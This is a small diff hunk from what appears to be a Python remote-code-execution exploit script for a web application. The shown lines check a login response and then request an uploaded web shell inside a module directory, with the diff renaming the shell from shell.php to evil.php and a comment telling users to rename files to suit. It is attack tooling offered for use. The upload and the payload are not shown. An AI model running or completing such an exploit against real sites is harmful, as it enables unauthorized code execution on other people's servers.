@@ -66,7 +66,7 @@ else:
     print("Login problem. response code:", login_response.status_code)
 
 # rename to your likings if you don't have an exploit.zip and shell.php
-rce_url = f"{exp_url}/data/modules/exploit/shell.php"
+rce_url = f"{exp_url}/data/modules/exploit/evil.php"
 
 rce=requests.get(rce_url)
 
